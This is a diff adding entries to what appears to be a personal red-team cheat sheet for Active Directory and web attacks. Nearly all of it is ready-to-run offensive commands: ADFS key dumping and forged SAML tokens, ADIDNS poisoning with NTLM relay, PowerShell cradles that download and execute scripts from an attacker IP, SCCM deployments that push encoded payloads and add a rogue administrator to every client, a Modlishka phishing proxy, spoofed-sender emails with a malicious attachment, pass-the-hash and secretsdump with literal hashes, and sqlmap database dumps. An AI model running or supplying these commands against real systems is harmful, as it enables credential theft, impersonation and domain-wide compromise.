@@ -103,6 +103,55 @@ Add-DomainGroupMember -Identity 'MAILADMINS' -Members 'willy' -Credential $Cred 
 get-domainuser willy
 Get-DomainGroupMember -Identity 'MAILADMINS'
 ```
+adfsdump + adfspoof usage (best practice: run as SYSTEM), must be able to interact with domain
+```
+# check
+Get-AdfsProperties
+# sploit
+ADFSDump.exe
+# save Private Key as dkm-private-key.txt
+# save Encrypted Signing Key as encrypted-signing-key.b64.txt
+# 1. b64 decode signing key into a .bin
+cat encrypted-signing-key.b64.txt | base64 -d > encrypted-signing-key.bin
+# 2. manually use hex editor on dkm private key to form a .bin
+cat dkm-private-key.txt | tr -d "-" | xxd -r -p > dkm-private-key.bin
+```
+adfspoof (make sure to fix time first!!)
+```
+sudo net time set -S dc.domain.local
+python3 ADFSpoof.py -b /path/to/encrypted-signing-key.bin /path/to/dkm-private-key.bin -s ADFS_SERVER.DOMAIN.LOCAL saml2 --endpoint "https://SAMLENDPOINT.DOMAIN.LOCAL/SamlResponseServlet" --nameidformat 'urn:oasis:names:tc:SAML:2.0:nameid-format:transient' --nameid 'DOMAIN\USER_TO_SPOOF' --rpidentifier 'IDENTIFIER_FOR_SAMLENDPOINT_ME_XXX-XXX-etc' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"><AttributeValue>DOMAIN\USER_TO_SPOOF</AttributeValue></Attribute>'
+```
+```
+take the output and use burp, paste into the SAMLResponse=[PASTE HERE] , usually POST /SamlResponseServlet to SAMLENDPOINT.DOMAIN.LOCAL
+```
+adidns abuse (Active Directory Integrated DNS ADIDNS) [sauce](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/) + usually with ntlmrelayx or responder
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/view.txt')
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/mad.txt')
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/dns.txt')
+```
+```
+# enum
+get-ADIDNSZone
+get-ADIDNSPermission
+Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord <<-- checks if we can create wildcard
+```
+```
+# sploit
+proxychains -q -f servicedesk.conf impacket-ntlmrelayx -t smb://sccm.domain.local -smb2support
+New-ADIDNSNode -Verbose -Node * -Data 10.10.14.44
+Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data 10.10.14.44) -Verbose
+# loop (for when something keeps cleaning our records)
+while(1){& New-ADIDNSNode -Verbose -Node * -Data 10.10.14.44;Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data 10.10.14.44) -Verbose;start-sleep -seconds 5}
+```
+```
+# check
+Resolve-DnsName NameThatDoesntExist
+```
+adidns dump (needs valid creds)
+```
+proxychains -q -f server04.conf adidnsdump -u 'domain.local\guest' ldap://dc.domain.local -r
+```
 bloodhound with ldap (non-domain-joined) (either make sure dns can find domain fqdn or specify DC)
 ```
 invoke-bloodhound -collectionmethod all -domain "final.com" -LDAPUser "jack" -LDAPPass "P@ssw0rd" -DomainController 10.10.10.10
@@ -253,6 +302,10 @@ Start-Dnscat2 -Domain <dnscat2 server> -LookupTypes @("CNAME","MX","AAAA") -Cons
 # Do not encrypt the session. Encryption is enabled by default.
 Start-Dnscat2 -Domain <dnscat2 server> -NoEncryption
 ```
+dnsenum usage
+```
+dnsenum target.domain.com --dnsserver 10.10.110.13
+```
 enable rdp
 ```
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
@@ -291,6 +344,11 @@ kerberos::golden /user:h4x /domain:CURRENT_DOMAIN /sid:CURRENT_DOMAIN_SID /krbtg
 ```
 dir \\rdc02.corpy.com\c$
 ```
+gmsa enum (group managed service accounts) - use ad.txt
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/ad.txt')
+Get-ADServiceAccount -filter * -prop * -server DOMAIN.local | Select Name,DNSHostName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInternal,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,msDS-ManagedPassword,ServicePrincipalNames
+```
 gobuster
 ```
 gobuster dir -u http://web01.evil.com/ -w /usr/share/wordlists/dirb/big.txt -b 403,404 -t 50 -k -x .htm,.html,.log,.sh,.shtml,.sql,.txt,.xml | tee gobuster.txt
@@ -309,6 +367,10 @@ hashcat generate password list
 ```
 hashcat --force list.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles5.rule -r /usr/share/hashcat/rules/append_atsign.rule -r /usr/share/hashcat/rules/append_exclamation.rule --stdout | sort -u > list-uniq.txt
 ```
+hashcat crack krb5tgs (13100) [hashcat hashes ref](https://hashcat.net/wiki/doku.php?id=example_hashes)
+```
+sudo hashcat -m 13100 krb5tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
+```
 impacket-psexec - kerberos
 ```
 export KRB5CCNAME=/home/kali/ccc5/krb5cc.pat
@@ -318,11 +380,27 @@ proxychains -q -f ssh.conf impacket-psexec corpy.com/pat@dmzdc01.corpy.com -k -n
 ```
 impacket-psexec - pth
 ```
-proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes aad3b435b51404eeaad3b435b51404ee:2060951907129392809244825245de08
+proxychains -q -f met.conf impacket-psexec administrator@sql05.corpy.com -hashes :2060951907129392809244825245de08
 ```
 impacket-psexec - pwd
 ```
 proxychains -q -f chi.conf impacket-psexec TRICKY/sqlsvc:'4dfgdfFFF542'@sql07.corpy.com 
+```
+impacket-getuserspn
+```
+proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw0rd'
+```
+```
+# get TGS
+proxychains -q -f nextcloud.conf impacket-GetUserSPNs domain.local/'hola':'P@ssw0rd' -request
+```
+impacket-secretsdump
+```
+proxychains -q -f met.conf impacket-secretsdump administrator@sccm.domain.local -hashes :1b0cf20be58b57aa85fae91dccc4e63e
+```
+kerberos set time to dc (fix clock) (fix time)
+```
+sudo proxychains -q -f nextcloud.conf net time set -S dc.domain.local
 ```
 killdef
 ```
@@ -390,6 +468,48 @@ python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b Inject
 makewrap -> use -p 1433 to avoid clashing with basic.rc (-p 443)
 ```
 python3 makewrap.py -a 64 -l 192.168.10.11 -p 1433
+```
+manageengine custom schedules RCE
+```
+general settings > custom schedules
+# custom triggers
+sudo tcpdump -i tun0 ip proto \\icmp
+criteria: priority is High
+action: cmd /c ping 10.10.14.44
+```
+modlishka usage
+```
+wget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64
+chmod +x Modlishka-linux-amd64
+./Modlishka-linux-amd64 -config ./modlishka.json
+tail -f requests.log
+```
+```
+# modliskha json
+{
+  "proxyDomain": "domain.com",
+  "listeningAddress": "10.10.14.44",
+
+  "target": "target.domain.com",
+  "targetResources": "",
+  "targetRules": "",
+  "terminateTriggers": "",
+  "terminateRedirectUrl": "",
+  "trackingCookie": "id",
+  "trackingParam": "id",
+  "jsRules":"",
+  "forceHTTPS": false,
+  "forceHTTP": false,
+  "dynamicMode": false,
+  "debug": true,
+  "logPostOnly": false,
+  "disableSecurity": true,
+  "log": "requests.log",
+  "plugins": "all",
+  "cert": "<public key from CA>",
+  "certKey": "<private key generated when making CSR>",
+  "certPool": ""
+}
 ```
 met socks
 ```
@@ -465,6 +585,10 @@ proxychains -q -f met.conf impacket-ntlmrelayx --no-http-server -smb2support -t 
 # current sql
 xp_dirtree '\\192.168.10.11\a';
 ```
+nxc usage (netexec)
+```
+proxychains -q -f nextcloud.conf nxc smb 192.168.20.10 -u users.txt -p pass.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
+```
 powershell cred
 ```
 $username = 'username'
@@ -479,6 +603,60 @@ $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
 # decode
 [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
 ```
+powershell enter-pssession (winrm)
+```
+Enter-PSSession -Computer 192.168.20.15 -Credential domain\hola -Authentication Negotiate -Verbose  
+```
+powersccm usage (abuse sccm) [sauce](https://github.com/PowerShellMafia/PowerSCCM)
+```
+iex(new-object net.webclient).downloadstring('http://10.10.14.44/sccm.txt')
+Find-LocalSccmInfo
+# output looks like:
+SiteCode ManagementServer
+-------- ----------------
+HO1      sccm.HoLa.local
+```
+```
+# add new sccm session
+New-SccmSession -ComputerName SCCM -SiteCode HO1 -ConnectionType WMI
+Get-SCCMSession | Get-SCCMComputer
+Get-SCCMSession | Get-SCCMCollection
+```
+```
+# add new sccm application and collection
+Get-SCCMSession | New-Sccmapplication -ApplicationName "appie" -PowershellScript "powershell -e B64CMD"
+```
+```
+# deploy to all servers (not that recommended)
+Get-SCCMSession | New-SccmapplicationDeployment -ApplicationName "appie" -Assignment "update" -CollectionName "All Systems"
+Get-SCCMSession | Invoke-SCCMDeviceCheckin -CollectionName "All Systems"
+```
+```
+# deploy to specific target server
+Get-SCCMSession | New-SCCMCollection -CollectionName "collie" -CollectionType "Device"
+Get-SCCMSession | Add-SCCMDeviceToCollection -ComputerNameToAdd "TARGETSERVER" -CollectionName "collie"
+Get-SCCMSession | New-SccmapplicationDeployment -ApplicationName "appie" -Assignment "update" -CollectionName "collie"
+Get-SCCMSession | Invoke-SCCMDeviceCheckin -CollectionName "collie"
+```
+```
+# if the above don't work, NATIVE SCCM TOOLS
+cd C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin
+gci -filter ConfigurationManager.psd1
+import-module .\ConfigurationManager.psd1
+cd HO1: <<-- IMPORTANT: THE COLON IS IMPORTANT, site is based on Find-LocalSccmInfo
+Get-CMSite
+Get-CMManagementPoint
+Get-CMActiveDirectoryForest
+New-CMScript -ScriptName scrippie -Fast -ScriptText "net user jack P@ssw0rd /add;net localgroup Administrators jack /add"; Get-CMScript -Fast -ScriptName scrippie | Approve-CMScript;Get-CMScript -Fast -ScriptName scrippie | Invoke-CMScript -CollectionName 'All Desktop and Server Clients'
+# now login as jack P@ssw0rd on the sccm clients from Get-SCCMSession | Get-SCCMComputer
+```
+```
+# backup commands - creating new sccm site
+Set-Location 'C:\Program Files (x86)\Microsoft Configuration Manager\AdminConsole\bin'
+Import-Module .\ConfigurationManager.psd1
+New-PSDrive -Name "HO2" -PSProvider "CMSite" -Root "sccm.DOMAIN.local" -Description "HO2"
+```
+
 printspoofer
 ```
 python3 makerunspace.py -a 64 -l 192.168.10.11 -p 443 -b PipePipe
@@ -544,6 +722,10 @@ runspace shortcut (cmd)
 bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
 ```
+smbmap usage
+```
+proxychains -q -f nextcloud.conf smbmap -u 'hola' -p 'P@ssw0rd' -H 192.168.20.10
+```
 sql enum
 ```
 exec sp_linkedservers;
@@ -565,6 +747,39 @@ EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT SQL03;
 EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT SQL03;
 EXEC ('xp_cmdshell ''powershell -enc JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4ANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA=''') AT SQL03;
 ```
+sqlmap all (takes very long)
+```
+sqlmap -r burp.req --timeout=60 --proxy="http://127.0.0.1:8080" -a
+sqlmap -r burp.req --timeout=60 --proxy="http://127.0.0.1:8080" --level=5 --risk=2 -p "search" -a --fresh-queries
+```
+sqlmap param boolean
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B"
+```
+sqlmap param databases
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL
+```
+sqlmap param tables
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables
+```
+sqlmap param columns
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables --columns
+```
+sqlmap dump specific database
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 --dbms=MySQL -D "dataleaks" --tables --dump
+```
+sqlmap dump specific table
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 --dbms=MySQL -D "dataleaks" -T "GoGames" --dump --fresh-queries
+```
+sqlmap dump specific columns
+```
+sqlmap -r burp.req --timeout=60 --level=5 --risk=2 -p "search" --technique="B" --dbms=MySQL -D "dataleaks" --tables --dump -C "username","email","password","hash"
+```
 ssh authorized_keys
 ```
 echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0pEdTg2aEJycDBWeXZibjhxSHhRWnprc3F2SWlJU1lYZDRxaW90b1padHRMTGlTSS9GWVFxT2xUUDBIeDFaUWNyZ0J3RmZObnB1dGJpK0lEb0RKeXo5QkxtSDE3WGhvYnF6Wk95bkREY1gzb2ZDeDY2a1YwZk5nSzhKTy91ZGhLNjZvc3pXaDdWUHgrOWJFajl6V1JjM3dvRUt4aDc2NVF2QTN6aVJQZ2NLRzFPWHBReVRRZE5oNVI0MVpCRkR2RDM3MFhSL3dMd0pYWnY4K3BEbjZidzFIQ3JNb00yNENJdFVlUmpvSVJhN25mTkluM2dzampRZ2NudC8wYlBYWE44c0lhamdNL1Fsb3ViaWlTclBna2xPNmJNS2RrRHpYTGlJdTNUYmNwNTVQbHVlNm15K0hOdWthYjdOa1U0akw5SjhobXZzZnBlcW9BMzJZdlUrTUhVQ0FmRFNkbHdtRFJscVFmS0kvcXh0cCtLMFFzSjNEK1ZDUHpNcGtlV2xHd1I3OW55WDNiQUZESVhtd1YyaEtldDJ5dWIxanMxMFYwTU5nSi9nMk1OTms5WVJrQ3NRcXptQ3VNajN6TG9Qa1krTmFMZjd4cUdJSTZSYW1zUnNTL01kNzF3T3ZGNjlpN2JhVklycTN4VTQxeVQ1bWM9IGthbGlAa2FsaQo=" | base64 -d >> authorized_keys
@@ -573,6 +788,18 @@ echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0
 ssh -i ~/.ssh/id_rsa 'pat@corpy.com'@192.168.106.164
 ```
 sshuttle usage
+```
+sshuttle -r root@nextcloud 192.168.20.0/24 192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 -e 'ssh -i /home/kali/.ssh/id_rsa' -v
+```
+swaks usage (no attachment)
+```
+swaks --to TARGET_EMAIL --from SPOOFED_EMAIL --server IP_OR_URL --port 25 --body @body.txt --header "Subject: urgent"
+```
+swaks attachment
+```
+swaks --to TARGET_EMAIL --from SPOOFED_EMAIL --server IP_OR_URL --port 25 --body @body.txt --header "Subject: urgent" --attach inject.doc
+```
+sshuttle usage (with id_rsa login)
 ```
 sshuttle -r root@nextcloud 192.168.20.0/24 192.168.21.0/24 192.168.22.0/24 192.168.23.0/24 192.168.24.0/24 -e 'ssh -i /home/kali/.ssh/id_rsa' -v
 ```
@@ -609,6 +836,14 @@ windows privesc - samdump
 ```
 icacls C:\Windows\System32\config\Security
 extrac32 /c /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\Security .\Security.txt
+```
+winrm usage
+```
+proxychains -q -f nextcloud.conf evil-winrm -i 192.168.20.15 -u 'hola' -p 'P@ssw0rd'
+```
+winrm pth
+```
+proxychains -q -f met.conf evil-winrm -i dc.domain.local -u 'domain\admin' -H '22be2f4edecb047c1529ad275fd82fe3'
 ```
 wrap
 ```
